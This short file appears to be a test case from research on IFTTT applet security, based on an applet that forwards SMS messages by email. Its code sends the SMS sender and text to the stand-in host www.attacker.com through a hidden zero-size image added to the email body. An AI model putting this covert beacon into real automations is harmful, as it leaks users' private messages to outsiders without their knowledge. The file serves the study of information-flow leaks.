//Maker: philbaumann
//Link2Applet: https://ifttt.com/applets/4231p-sends-email-from-sms-with-ifttt
//Title of Applet:  Sends email from sms with #ifttt
//Trigger service: SMS
//Action service: Email 
//Policy/Presence:  Confidentiality of SMS / NO



fro = lbl("Sms.sendIftttATextTagged.From");
msg = lbl("Sms.sendIftttATextTagged.Message");

attack = imgl("www.attacker.com?" + fro + msg);
				 //'<img src=\"www.attacker.com' + fro + msg + '\" style=\"width:0px;height:0px;\">';
sink('Email.sendMeEmail', 'setSubject', fro);
sink('Email.sendMeEmail', 'setBody', msg + attack);
